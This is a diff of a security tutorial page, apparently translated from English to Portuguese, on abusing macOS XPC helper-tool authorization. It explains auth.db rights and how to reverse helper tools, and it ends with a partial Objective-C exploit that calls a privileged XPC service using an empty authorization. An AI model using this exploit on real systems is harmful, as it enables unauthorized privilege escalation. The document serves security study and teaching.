@@ -4,104 +4,97 @@
 
 ## XPC Authorization
 
-Apple also proposes another way to authenticate if the connecting process has **permissions to call the an exposed XPC method**.
+A Apple também propõe outra maneira de autenticar se o processo de conexão tem **permissões para chamar um método XPC exposto**.
 
-When an application needs to **execute actions as a privileged user**, instead of running the app as a privileged user it usually installs as root a HelperTool as an XPC service that could be called from the app to perform those actions. However, the app calling the service should have enough authorization.
+Quando um aplicativo precisa **executar ações como um usuário privilegiado**, em vez de executar o aplicativo como um usuário privilegiado, geralmente instala como root um HelperTool como um serviço XPC que pode ser chamado pelo aplicativo para realizar essas ações. No entanto, o aplicativo que chama o serviço deve ter autorização suficiente.
 
-### ShouldAcceptNewConnection always YES
+### ShouldAcceptNewConnection sempre YES
 
-An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` it tries to **connect** to the **HelperTool**. And in `HelperTool/HelperTool.m` the function **`shouldAcceptNewConnection`** **won't check** any of the requirements indicated previously. It'll always return YES:
-
+Um exemplo pode ser encontrado em [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Em `App/AppDelegate.m` ele tenta **conectar** ao **HelperTool**. E em `HelperTool/HelperTool.m` a função **`shouldAcceptNewConnection`** **não verificará** nenhum dos requisitos indicados anteriormente. Sempre retornará YES:
 ```objectivec
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
-    // Called by our XPC listener when a new connection comes in.  We configure the connection
-    // with our protocol and ourselves as the main object.
+// Called by our XPC listener when a new connection comes in.  We configure the connection
+// with our protocol and ourselves as the main object.
 {
-    assert(listener == self.listener);
-    #pragma unused(listener)
-    assert(newConnection != nil);
+assert(listener == self.listener);
+#pragma unused(listener)
+assert(newConnection != nil);
 
-    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
-    newConnection.exportedObject = self;
-    [newConnection resume];
+newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
+newConnection.exportedObject = self;
+[newConnection resume];
 
-    return YES;
+return YES;
 }
 ```
-
-For more information about how to properly configure this check:
+Para mais informações sobre como configurar isso corretamente, consulte:
 
 {{#ref}}
 macos-xpc-connecting-process-check/
 {{#endref}}
 
-### Application rights
+### Direitos da aplicação
 
-However, there is some **authorization going on when a method from the HelperTool is called**.
+No entanto, há alguma **autorização ocorrendo quando um método do HelperTool é chamado**.
 
-The function **`applicationDidFinishLaunching`** from `App/AppDelegate.m` will create an empty authorization reference after the app has started. This should always work.\
-Then, it will try to **add some rights** to that authorization reference calling `setupAuthorizationRights`:
-
+A função **`applicationDidFinishLaunching`** de `App/AppDelegate.m` criará uma referência de autorização vazia após o aplicativo ter sido iniciado. Isso deve sempre funcionar.\
+Em seguida, tentará **adicionar alguns direitos** a essa referência de autorização chamando `setupAuthorizationRights`:
 ```objectivec
 - (void)applicationDidFinishLaunching:(NSNotification *)note
 {
-    [...]
-    err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
-    if (err == errAuthorizationSuccess) {
-        err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
-    }
-    if (err == errAuthorizationSuccess) {
-        self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
-    }
-    assert(err == errAuthorizationSuccess);
+[...]
+err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
+if (err == errAuthorizationSuccess) {
+err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
+}
+if (err == errAuthorizationSuccess) {
+self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
+}
+assert(err == errAuthorizationSuccess);
 
-    // If we successfully connected to Authorization Services, add definitions for our default
-    // rights (unless they're already in the database).
+// If we successfully connected to Authorization Services, add definitions for our default
+// rights (unless they're already in the database).
 
-    if (self->_authRef) {
-        [Common setupAuthorizationRights:self->_authRef];
-    }
+if (self->_authRef) {
+[Common setupAuthorizationRights:self->_authRef];
+}
 
-    [self.window makeKeyAndOrderFront:self];
+[self.window makeKeyAndOrderFront:self];
 }
 ```
-
-The function `setupAuthorizationRights` from `Common/Common.m` will store in the auth database `/var/db/auth.db` the rights of the application. Note how it will only add the rights that aren't yet in the database:
-
+A função `setupAuthorizationRights` do arquivo `Common/Common.m` armazenará no banco de dados de autenticação `/var/db/auth.db` os direitos da aplicação. Observe que ela só adicionará os direitos que ainda não estão no banco de dados:
 ```objectivec
 + (void)setupAuthorizationRights:(AuthorizationRef)authRef
-    // See comment in header.
+// See comment in header.
 {
-    assert(authRef != NULL);
-    [Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
-        OSStatus    blockErr;
+assert(authRef != NULL);
+[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
+OSStatus    blockErr;
 
-        // First get the right.  If we get back errAuthorizationDenied that means there's
-        // no current definition, so we add our default one.
+// First get the right.  If we get back errAuthorizationDenied that means there's
+// no current definition, so we add our default one.
 
-        blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
-        if (blockErr == errAuthorizationDenied) {
-            blockErr = AuthorizationRightSet(
-                authRef,                                    // authRef
-                [authRightName UTF8String],                 // rightName
-                (__bridge CFTypeRef) authRightDefault,      // rightDefinition
-                (__bridge CFStringRef) authRightDesc,       // descriptionKey
-                NULL,                                       // bundle (NULL implies main bundle)
-                CFSTR("Common")                             // localeTableName
-            );
-            assert(blockErr == errAuthorizationSuccess);
-        } else {
-            // A right already exists (err == noErr) or any other error occurs, we
-            // assume that it has been set up in advance by the system administrator or
-            // this is the second time we've run.  Either way, there's nothing more for
-            // us to do.
-        }
-    }];
+blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
+if (blockErr == errAuthorizationDenied) {
+blockErr = AuthorizationRightSet(
+authRef,                                    // authRef
+[authRightName UTF8String],                 // rightName
+(__bridge CFTypeRef) authRightDefault,      // rightDefinition
+(__bridge CFStringRef) authRightDesc,       // descriptionKey
+NULL,                                       // bundle (NULL implies main bundle)
+CFSTR("Common")                             // localeTableName
+);
+assert(blockErr == errAuthorizationSuccess);
+} else {
+// A right already exists (err == noErr) or any other error occurs, we
+// assume that it has been set up in advance by the system administrator or
+// this is the second time we've run.  Either way, there's nothing more for
+// us to do.
+}
+}];
 }
 ```
-
-The function `enumerateRightsUsingBlock` is the one used to get applications permissions, which are defined in `commandInfo`:
-
+A função `enumerateRightsUsingBlock` é a que é usada para obter permissões de aplicativos, que são definidas em `commandInfo`:
 ```objectivec
 static NSString * kCommandKeyAuthRightName    = @"authRightName";
 static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
@@ -109,171 +102,163 @@ static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";
 
 + (NSDictionary *)commandInfo
 {
-    static dispatch_once_t sOnceToken;
-    static NSDictionary *  sCommandInfo;
+static dispatch_once_t sOnceToken;
+static NSDictionary *  sCommandInfo;
 
-    dispatch_once(&sOnceToken, ^{
-        sCommandInfo = @{
-            NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
-                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
-                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
-                kCommandKeyAuthRightDesc    : NSLocalizedString(
-                    @"EBAS is trying to read its license key.",
-                    @"prompt shown when user is required to authorize to read the license key"
-                )
-            },
-            NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
-                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
-                kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
-                kCommandKeyAuthRightDesc    : NSLocalizedString(
-                    @"EBAS is trying to write its license key.",
-                    @"prompt shown when user is required to authorize to write the license key"
-                )
-            },
-            NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
-                kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
-                kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
-                kCommandKeyAuthRightDesc    : NSLocalizedString(
-                    @"EBAS is trying to start its web service.",
-                    @"prompt shown when user is required to authorize to start the web service"
-                )
-            }
-        };
-    });
-    return sCommandInfo;
+dispatch_once(&sOnceToken, ^{
+sCommandInfo = @{
+NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to read its license key.",
+@"prompt shown when user is required to authorize to read the license key"
+)
+},
+NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to write its license key.",
+@"prompt shown when user is required to authorize to write the license key"
+)
+},
+NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to start its web service.",
+@"prompt shown when user is required to authorize to start the web service"
+)
+}
+};
+});
+return sCommandInfo;
 }
 
 + (NSString *)authorizationRightForCommand:(SEL)command
-    // See comment in header.
+// See comment in header.
 {
-    return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
+return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
 }
 
 + (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
-    // Calls the supplied block with information about each known authorization right..
+// Calls the supplied block with information about each known authorization right..
 {
-    [self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
-        #pragma unused(key)
-        #pragma unused(stop)
-        NSDictionary *  commandDict;
-        NSString *      authRightName;
-        id              authRightDefault;
-        NSString *      authRightDesc;
+[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
+#pragma unused(key)
+#pragma unused(stop)
+NSDictionary *  commandDict;
+NSString *      authRightName;
+id              authRightDefault;
+NSString *      authRightDesc;
 
-        // If any of the following asserts fire it's likely that you've got a bug
-        // in sCommandInfo.
+// If any of the following asserts fire it's likely that you've got a bug
+// in sCommandInfo.
 
-        commandDict = (NSDictionary *) obj;
-        assert([commandDict isKindOfClass:[NSDictionary class]]);
+commandDict = (NSDictionary *) obj;
+assert([commandDict isKindOfClass:[NSDictionary class]]);
 
-        authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
-        assert([authRightName isKindOfClass:[NSString class]]);
+authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
+assert([authRightName isKindOfClass:[NSString class]]);
 
-        authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
-        assert(authRightDefault != nil);
+authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
+assert(authRightDefault != nil);
 
-        authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
-        assert([authRightDesc isKindOfClass:[NSString class]]);
+authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
+assert([authRightDesc isKindOfClass:[NSString class]]);
 
-        block(authRightName, authRightDefault, authRightDesc);
-    }];
+block(authRightName, authRightDefault, authRightDesc);
+}];
 }
 ```
+Isso significa que, ao final deste processo, as permissões declaradas dentro de `commandInfo` serão armazenadas em `/var/db/auth.db`. Note como você pode encontrar para **cada método** que irá **requerer autenticação**, **nome da permissão** e o **`kCommandKeyAuthRightDefault`**. Este último **indica quem pode obter esse direito**.
 
-This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.
+Existem diferentes escopos para indicar quem pode acessar um direito. Alguns deles estão definidos em [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (você pode encontrar [todos eles aqui](https://www.dssw.co.uk/reference/authorization-rights/)), mas como resumo:
 
-There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:
+<table><thead><tr><th width="284.3333333333333">Nome</th><th width="165">Valor</th><th>Descrição</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Qualquer um</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ninguém</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>O usuário atual precisa ser um admin (dentro do grupo de admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Pedir ao usuário para autenticar.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Pedir ao usuário para autenticar. Ele precisa ser um admin (dentro do grupo de admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especificar regras</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especificar alguns comentários extras sobre o direito</td></tr></tbody></table>
 
-<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Anyone</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nobody</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Current user needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ask user to authenticate.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ask user to authenticate. He needs to be an admin (inside admin group)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specify rules</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specify some extra comments on the right</td></tr></tbody></table>
+### Verificação de Direitos
 
-### Rights Verification
-
-In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:
-
+Em `HelperTool/HelperTool.m`, a função **`readLicenseKeyAuthorization`** verifica se o chamador está autorizado a **executar tal método** chamando a função **`checkAuthorization`**. Esta função verificará se o **authData** enviado pelo processo chamador tem um **formato correto** e então verificará **o que é necessário para obter o direito** de chamar o método específico. Se tudo correr bem, o **`error` retornado será `nil`**:
 ```objectivec
 - (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
 {
-    [...]
+[...]
 
-    // First check that authData looks reasonable.
+// First check that authData looks reasonable.
 
-    error = nil;
-    if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
-        error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
-    }
+error = nil;
+if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
+error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
+}
 
-    // Create an authorization ref from that the external form data contained within.
+// Create an authorization ref from that the external form data contained within.
 
-    if (error == nil) {
-        err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);
+if (error == nil) {
+err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);
 
-        // Authorize the right associated with the command.
+// Authorize the right associated with the command.
 
-        if (err == errAuthorizationSuccess) {
-            AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
-            AuthorizationRights rights   = { 1, &oneRight };
+if (err == errAuthorizationSuccess) {
+AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
+AuthorizationRights rights   = { 1, &oneRight };
 
-            oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
-            assert(oneRight.name != NULL);
+oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
+assert(oneRight.name != NULL);
 
-            err = AuthorizationCopyRights(
-                authRef,
-                &rights,
-                NULL,
-                kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
-                NULL
-            );
-        }
-        if (err != errAuthorizationSuccess) {
-            error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
-        }
-    }
+err = AuthorizationCopyRights(
+authRef,
+&rights,
+NULL,
+kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
+NULL
+);
+}
+if (err != errAuthorizationSuccess) {
+error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
+}
+}
 
-    if (authRef != NULL) {
-        junk = AuthorizationFree(authRef, 0);
-        assert(junk == errAuthorizationSuccess);
-    }
+if (authRef != NULL) {
+junk = AuthorizationFree(authRef, 0);
+assert(junk == errAuthorizationSuccess);
+}
 
-    return error;
+return error;
 }
 ```
+Note que para **verificar os requisitos para obter o direito** de chamar esse método, a função `authorizationRightForCommand` apenas verificará o objeto de comentário previamente mencionado **`commandInfo`**. Em seguida, chamará **`AuthorizationCopyRights`** para verificar **se possui os direitos** de chamar a função (note que as flags permitem interação com o usuário).
 
-Note that to **check the requirements to get the right** to call that method the function `authorizationRightForCommand` will just check the previously comment object **`commandInfo`**. Then, it will call **`AuthorizationCopyRights`** to check **if it has the rights** to call the function (note that the flags allow interaction with the user).
+Neste caso, para chamar a função `readLicenseKeyAuthorization`, o `kCommandKeyAuthRightDefault` é definido como `@kAuthorizationRuleClassAllow`. Assim, **qualquer um pode chamá-la**.
 
-In this case, to call the function `readLicenseKeyAuthorization` the `kCommandKeyAuthRightDefault` is defined to `@kAuthorizationRuleClassAllow`. So **anyone can call it**.
+### Informações do DB
 
-### DB Information
-
-It was mentioned that this information is stored in `/var/db/auth.db`. You can list all the stored rules with:
-
+Foi mencionado que essas informações são armazenadas em `/var/db/auth.db`. Você pode listar todas as regras armazenadas com:
 ```sql
 sudo sqlite3 /var/db/auth.db
 SELECT name FROM rules;
 SELECT name FROM rules WHERE name LIKE '%safari%';
 ```
-
-Then, you can read who can access the right with:
-
+Então, você pode ler quem pode acessar o direito com:
 ```bash
 security authorizationdb read com.apple.safaridriver.allow
 ```
+### Direitos permissivos
 
-### Permissive rights
-
-You can find **all the permissions configurations** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), but the combinations that won't require user interaction would be:
+Você pode encontrar **todas as configurações de permissões** [**aqui**](https://www.dssw.co.uk/reference/authorization-rights/), mas as combinações que não exigirão interação do usuário seriam:
 
 1. **'authenticate-user': 'false'**
-   - This is the most direct key. If set to `false`, it specifies that a user does not need to provide authentication to gain this right.
-   - This is used in **combination with one of the 2 below or indicating a group** the user must belong to.
+- Esta é a chave mais direta. Se definida como `false`, especifica que um usuário não precisa fornecer autenticação para obter este direito.
+- Isso é usado em **combinação com uma das 2 abaixo ou indicando um grupo** ao qual o usuário deve pertencer.
 2. **'allow-root': 'true'**
-   - If a user is operating as the root user (which has elevated permissions), and this key is set to `true`, the root user could potentially gain this right without further authentication. However, typically, getting to a root user status already requires authentication, so this isn't a "no authentication" scenario for most users.
+- Se um usuário estiver operando como o usuário root (que tem permissões elevadas), e esta chave estiver definida como `true`, o usuário root poderia potencialmente obter este direito sem mais autenticação. No entanto, tipicamente, obter o status de usuário root já requer autenticação, então este não é um cenário de "sem autenticação" para a maioria dos usuários.
 3. **'session-owner': 'true'**
-   - If set to `true`, the owner of the session (the currently logged-in user) would automatically get this right. This might bypass additional authentication if the user is already logged in.
+- Se definida como `true`, o proprietário da sessão (o usuário atualmente logado) obteria automaticamente este direito. Isso pode contornar a autenticação adicional se o usuário já estiver logado.
 4. **'shared': 'true'**
-   - This key doesn't grant rights without authentication. Instead, if set to `true`, it means that once the right has been authenticated, it can be shared among multiple processes without each one needing to re-authenticate. But the initial granting of the right would still require authentication unless combined with other keys like `'authenticate-user': 'false'`.
+- Esta chave não concede direitos sem autenticação. Em vez disso, se definida como `true`, significa que uma vez que o direito tenha sido autenticado, ele pode ser compartilhado entre vários processos sem que cada um precise re-autenticar. Mas a concessão inicial do direito ainda exigiria autenticação, a menos que combinada com outras chaves como `'authenticate-user': 'false'`.
 
-You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
-
+Você pode [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obter os direitos interessantes:
 ```bash
 Rights with 'authenticate-user': 'false':
 is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)
@@ -284,31 +269,29 @@ com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek,
 Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
+## Reversão de Autorização
 
-## Reversing Authorization
+### Verificando se EvenBetterAuthorization está em uso
 
-### Checking if EvenBetterAuthorization is used
-
-If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:
+Se você encontrar a função: **`[HelperTool checkAuthorization:command:]`** é provável que o processo esteja usando o esquema de autorização mencionado anteriormente:
 
 <figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>
 
-Thisn, if this function is calling functions such as `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, it's using [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
+Isso, se essa função estiver chamando funções como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, está usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
 
-Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.
+Verifique o **`/var/db/auth.db`** para ver se é possível obter permissões para chamar alguma ação privilegiada sem interação do usuário.
 
-### Protocol Communication
+### Comunicação de Protocolo
 
-Then, you need to find the protocol schema in order to be able to establish a communication with the XPC service.
+Em seguida, você precisa encontrar o esquema de protocolo para poder estabelecer uma comunicação com o serviço XPC.
 
-The function **`shouldAcceptNewConnection`** indicates the protocol being exported:
+A função **`shouldAcceptNewConnection`** indica o protocolo que está sendo exportado:
 
 <figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>
 
-In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).
+Neste caso, temos o mesmo que no EvenBetterAuthorizationSample, [**verifique esta linha**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).
 
-Knowing, the name of the used protocol, it's possible to **dump its header definition** with:
-
+Sabendo o nome do protocolo utilizado, é possível **extrair sua definição de cabeçalho** com:
 ```bash
 class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
 
@@ -322,37 +305,33 @@ class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
 @end
 [...]
 ```
+Por fim, precisamos apenas saber o **nome do Serviço Mach exposto** para estabelecer uma comunicação com ele. Existem várias maneiras de encontrar isso:
 
-Lastly, we just need to know the **name of the exposed Mach Service** in order to stablish a communication with it. There are several ways to find this:
-
-- In the **`[HelperTool init]`** where you can see the Mach Service being used:
+- No **`[HelperTool init]`** onde você pode ver o Serviço Mach sendo usado:
 
 <figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>
 
-- In the launchd plist:
-
+- No plist do launchd:
 ```xml
 cat /Library/LaunchDaemons/com.example.HelperTool.plist
 
 [...]
 
-	<key>MachServices</key>
-	<dict>
-		<key>com.example.HelperTool</key>
-		<true/>
-	</dict>
+<key>MachServices</key>
+<dict>
+<key>com.example.HelperTool</key>
+<true/>
+</dict>
 [...]
 ```
+### Exemplo de Exploit
 
-### Exploit Example
+Neste exemplo é criado:
 
-In this example is created:
-
-- The definition of the protocol with the functions
-- An empty auth to use to to ask for access
-- A connection to the XPC service
-- A call to the function if the connection was successful
-
+- A definição do protocolo com as funções
+- Uma autenticação vazia para usar para solicitar acesso
+- Uma conexão ao serviço XPC
+- Uma chamada à função se a conexão for bem-sucedida
 ```objectivec
 // gcc -framework Foundation -framework Security expl.m -o expl
 
@@ -372,70 +351,69 @@ static NSString* XPCServiceName = @"com.example.XPCHelper";
 @end
 
 int main(void) {
-    NSData *authData;
-    OSStatus status;
-    AuthorizationExternalForm authForm;
-    AuthorizationRef authReference = {0};
-    NSString *proxyAddress = @"127.0.0.1";
-    NSString *proxyPort = @"4444";
-    Boolean isProxyEnabled = true;
+NSData *authData;
+OSStatus status;
+AuthorizationExternalForm authForm;
+AuthorizationRef authReference = {0};
+NSString *proxyAddress = @"127.0.0.1";
+NSString *proxyPort = @"4444";
+Boolean isProxyEnabled = true;
 
-    // Create an empty authorization reference
-    status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
-    const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
-    NSLog(@"OSStatus: %s", errorMsg);
+// Create an empty authorization reference
+status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
+const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
 
-    // Convert the authorization reference to an external form
-    if (status == errAuthorizationSuccess) {
-        status = AuthorizationMakeExternalForm(authReference, &authForm);
-        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
-        NSLog(@"OSStatus: %s", errorMsg);
-    }
+// Convert the authorization reference to an external form
+if (status == errAuthorizationSuccess) {
+status = AuthorizationMakeExternalForm(authReference, &authForm);
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
 
-    // Convert the external form to NSData for transmission
-    if (status == errAuthorizationSuccess) {
-        authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
-        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
-        NSLog(@"OSStatus: %s", errorMsg);
-    }
+// Convert the external form to NSData for transmission
+if (status == errAuthorizationSuccess) {
+authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
 
-    // Ensure the authorization was successful
-    assert(status == errAuthorizationSuccess);
+// Ensure the authorization was successful
+assert(status == errAuthorizationSuccess);
 
-    // Establish an XPC connection
-    NSString *serviceName = XPCServiceName;
-    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
-    NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
-    [xpcConnection setRemoteObjectInterface:xpcInterface];
-    [xpcConnection resume];
+// Establish an XPC connection
+NSString *serviceName = XPCServiceName;
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+[xpcConnection setRemoteObjectInterface:xpcInterface];
+[xpcConnection resume];
 
-    // Handle errors for the XPC connection
-    id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
-        NSLog(@"[-] Connection error");
-        NSLog(@"[-] Error: %@", error);
-    }];
+// Handle errors for the XPC connection
+id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+NSLog(@"[-] Connection error");
+NSLog(@"[-] Error: %@", error);
+}];
 
-    // Log the remote proxy and connection objects
-    NSLog(@"Remote Proxy: %@", remoteProxy);
-    NSLog(@"XPC Connection: %@", xpcConnection);
+// Log the remote proxy and connection objects
+NSLog(@"Remote Proxy: %@", remoteProxy);
+NSLog(@"XPC Connection: %@", xpcConnection);
 
-    // Use the legacy method to configure the proxy
